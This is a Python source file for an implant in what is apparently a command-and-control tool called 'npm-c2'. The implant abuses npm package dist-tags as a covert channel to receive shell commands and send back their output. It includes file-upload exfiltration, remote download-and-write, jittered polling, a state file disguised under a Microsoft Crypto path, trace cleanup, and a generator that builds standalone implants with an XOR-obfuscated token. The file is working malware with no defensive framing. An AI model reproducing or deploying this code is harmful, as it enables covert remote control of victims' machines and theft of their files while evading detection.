import urllib.request
import urllib.error
import json
import subprocess
import time
import random
import sys
import base64
import os

from . import CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, MAX_TAG_LEN
from . import API, UA, decode_tag


class Implant:
    def __init__(self, package, token=None, interval=60, jitter=20, verbose=False):
        self.package = package
        self.token = token
        self.interval = interval
        self.jitter = jitter
        self.v = verbose
        self.seen = set()
        self.n = 0
        self.dirty = 0
        safe = package.replace("/", "_").replace("@", "")
        appdata = os.environ.get("APPDATA",
                   os.environ.get("TEMP", os.path.expanduser("~")))
        self.state_file = os.path.join(appdata, "Microsoft", "Crypto",
                                       f".rsa_{safe}.idx")

    def run(self):
        self._load()
        try:
            while True:
                try:
                    tags = self._fetch()
                    cmds = self._parse(tags)
                    for cmd in cmds:
                        if self.v:
                            print(f"[+] cmd: {cmd[:60]}")
                        out = self._exec(cmd)
                        if out and self.token:
                            self._reply(out)
                    self.n += 1
                    if self.n % 10 == 0:
                        if self.dirty:
                            self._save()
                            self.dirty = 0
                        if self.token:
                            self._beat()
                except Exception:
                    pass
                if self.v:
                    print(f"[*] poll #{self.n}")
                delay = self.interval + random.uniform(0, self.jitter)
                time.sleep(delay)
        finally:
            if self.dirty:
                self._save()

    def _load(self):
        try:
            with open(self.state_file) as f:
                for line in f:
                    line = line.strip()
                    if line:
                        self.seen.add(line)
        except FileNotFoundError:
            pass

    def _save(self):
        try:
            d = os.path.dirname(self.state_file)
            if not os.path.isdir(d):
                os.makedirs(d, exist_ok=True)
            with open(self.state_file, "w") as f:
                for tag in sorted(self.seen):
                    f.write(tag + "\n")
        except Exception:
            pass

    def _fetch(self):
        req = urllib.request.Request(API.format(self.package),
                                     headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.loads(r.read())

    def _parse(self, tags):
        cmds = []
        for name in tags:
            if not name.startswith(CMD_PREFIX):
                continue
            if name in self.seen:
                continue
            info = decode_tag(name)
            if info:
                self.seen.add(name)
                self.dirty += 1
                if len(self.seen) > 128:
                    self.seen.pop()
                cmds.append(info[1].decode(errors="replace"))
        return cmds

    def _exec(self, cmd):
        try:
            if cmd == "exit":
                self._clean()
                sys.exit(0)

            if cmd.startswith("sleep:"):
                val = cmd.split(":", 1)[1]
                self.interval = max(10, int(val))
                return f"interval={self.interval}"

            if cmd.startswith("dl:"):
                parts = cmd.split(":", 2)
                if len(parts) == 3:
                    return self._dl(parts[1], parts[2])
                return "dl: <url>:<path>"

            if cmd.startswith("up:"):
                path = cmd.split(":", 1)[1]
                try:
                    with open(path, "rb") as f:
                        data = base64.b64encode(f.read())[:1000]
                        return data.decode(errors="replace")
                except Exception as e:
                    return f"up fail: {e}"

            body = cmd
            if cmd.startswith("exec:"):
                body = cmd[5:]

            r = subprocess.run(body, shell=True, capture_output=True, timeout=30)
            out = r.stdout.decode(errors="replace")
            err = r.stderr.decode(errors="replace")
            return (out + err).strip()[:1000] or "(ok)"
        except subprocess.TimeoutExpired:
            return "(timeout)"
        except Exception as e:
            return f"({e})"

    def _dl(self, url, path):
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=30) as r:
            data = r.read()
        d = os.path.dirname(os.path.abspath(path))
        if not os.path.isdir(d):
            os.makedirs(d, exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        return f"dl {len(data)}b"

    def _reply(self, out):
        for tag in encode_payload(out.encode(), RES_PREFIX):
            self._put(tag)
        if self.v:
            print(f"[+] result sent")

    def _beat(self):
        nonce = os.urandom(3).hex()
        self._put(f"{HBT_PREFIX}{nonce}")

    def _put(self, tag):
        url = API.format(self.package) + "/" + tag
        data = json.dumps(TAG_VALUE).encode()
        headers = {"User-Agent": UA, "Content-Type": "application/json"}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        req = urllib.request.Request(url, data=data, method="PUT",
                                     headers=headers)
        try:
            urllib.request.urlopen(req, timeout=15)
        except Exception:
            pass

    def _clean(self):
        if not self.token:
            return
        try:
            for name in self._fetch():
                if name.startswith((CMD_PREFIX, RES_PREFIX, HBT_PREFIX)):
                    self._del(name)
        except Exception:
            pass

    def _del(self, tag):
        url = API.format(self.package) + "/" + tag
        headers = {"User-Agent": UA}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        req = urllib.request.Request(url, method="DELETE", headers=headers)
        try:
            urllib.request.urlopen(req, timeout=15)
        except Exception:
            pass


def encode_payload(data, prefix=CMD_PREFIX):
    b64 = base64.urlsafe_b64encode(data).rstrip(b"=").decode()
    room = MAX_TAG_LEN - len(prefix) - 7
    tags = []
    for i in range(0, len(b64), room):
        chunk = b64[i:i + room]
        nonce = os.urandom(3).hex()
        tags.append(f"{prefix}{nonce}_{chunk}")
    return tags


def generate_standalone(token=None, package=None):
    import inspect

    enc_src = inspect.getsource(encode_payload)
    dec_src = inspect.getsource(decode_tag)
    imp_src = inspect.getsource(Implant)

    obf_hex = ""
    pkg_name = package or "CHANGEME"
    if token and package:
        from . import obfuscate_token
        obf_hex = obfuscate_token(token, package)

    lines = [
        "#!/usr/bin/env python3",
        "import urllib.request, urllib.error, json, subprocess, time, random, sys, base64, os, argparse, hashlib",
        "",
        f'CMD_PREFIX = {repr(CMD_PREFIX)}',
        f'RES_PREFIX = {repr(RES_PREFIX)}',
        f'HBT_PREFIX = {repr(HBT_PREFIX)}',
        f'TAG_VALUE = {repr(TAG_VALUE)}',
        f'MAX_TAG_LEN = {MAX_TAG_LEN}',
        f'API = {repr(API)}',
        f'UA = {repr(UA)}',
        "",
        enc_src.strip(),
        "",
        dec_src.strip(),
        "",
    ]

    if obf_hex:
        lines += [
            f'_OBFUSCATED = {repr(obf_hex)}',
            "",
            "def deobfuscate_token(hexdata, pkg):",
            "    key = hashlib.sha256(pkg.encode()).digest()[:16]",
            "    raw = bytes.fromhex(hexdata)",
            "    dec = bytes(a ^ b for a, b in zip(raw, key * (len(raw) // len(key) + 1)))[:len(raw)]",
            "    try:",
            "        return dec.decode()",
            "    except UnicodeDecodeError:",
            "        return None",
            "",
        ]

    lines += [
        imp_src.strip(),
        "",
        "def main():",
        "    p = argparse.ArgumentParser(description='npm-c2 implant')",
        "    p.add_argument('--package', '-p', required=True)",
        "    p.add_argument('--token', '-t', default=None)",
        "    p.add_argument('--interval', type=int, default=60)",
        "    p.add_argument('--jitter', type=int, default=20)",
        "    p.add_argument('--verbose', '-v', action='store_true')",
        "    a = p.parse_args()",
    ]
    if obf_hex:
        lines += [
            "    tok = a.token or deobfuscate_token(_OBFUSCATED, a.package)",
            "    Implant(a.package, tok, a.interval, a.jitter, a.verbose).run()",
        ]
    else:
        lines += [
            "    Implant(a.package, a.token, a.interval, a.jitter, a.verbose).run()",
        ]
    lines += [
        "",
        "if __name__ == '__main__':",
        "    main()",
    ]
    return "\n".join(lines)
